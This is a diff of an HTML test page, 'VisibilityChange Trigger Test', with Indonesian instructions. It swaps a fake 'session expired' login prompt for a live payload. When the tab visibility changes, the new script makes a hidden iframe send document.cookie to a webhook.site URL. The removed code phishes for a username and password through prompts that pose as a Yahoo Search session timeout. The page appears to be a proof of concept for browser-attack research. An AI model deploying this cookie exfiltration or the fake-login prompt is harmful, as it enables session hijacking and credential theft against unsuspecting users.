@@ -13,7 +13,7 @@
   }
 </style>
 
-<!--<script>
+<script>
 let armed = false;
 
 document.addEventListener("visibilitychange", function () {
@@ -28,28 +28,23 @@ document.addEventListener("visibilitychange", function () {
     armed = false; // reset supaya bisa dipakai lagi
 
     const iframe = document.getElementById("iframe");
-    iframe.src =
-"javascript:(function(){\
-          var u = prompt('Browser session expired.\\nPlease sign in again to continue.\\nUsername:');\
-          if(u === null) return;\
-          var p = prompt('Password:');\
-          if(p === null) return;\
-          alert('This is your credentials\\n\\nUsername: ' + u + '\\nPassword: ' + p);\
-        })();";
+    iframe.src = "javascript:fetch('https://webhook.site/87b68ca7-0113-4596-82b2-0df1e3a2913a?cookie='+encodeURIComponent(document.cookie));";
   }
 });
-</script>-->
-<script>
-    document.addEventListener("visibilitychange", function () {
-      if (document.visibilityState === "hidden") {
-        document.getElementById("iframe").src =
-          "javascript:(function(){var u = prompt('Yahoo Search session expired.\\nPlease sign in again to continue.\\n\\nUsername:'); if (u == null) return;var p = prompt('password:'); if (p == null) return;alert('This is your credentials\\n\\nUsername: ' + u + '\\nPassword: ' + p)})()";
-      }
-    });
-  </script>
+</script>
 </head>
 
 <body>
+<center>
+  <br>
+  <h1>VisibilityChange Trigger Test</h1>
+  <p>
+    1️⃣ Klik halaman → tidak ada apa-apa<br>
+    2️⃣ Pindah tab / minimize browser<br>
+    3️⃣ Balik ke tab → popup muncul<br>
+    4️⃣ Ulangi → popup muncul lagi
+  </p>
+</center>
 
 <iframe id="iframe"></iframe>
 </body>
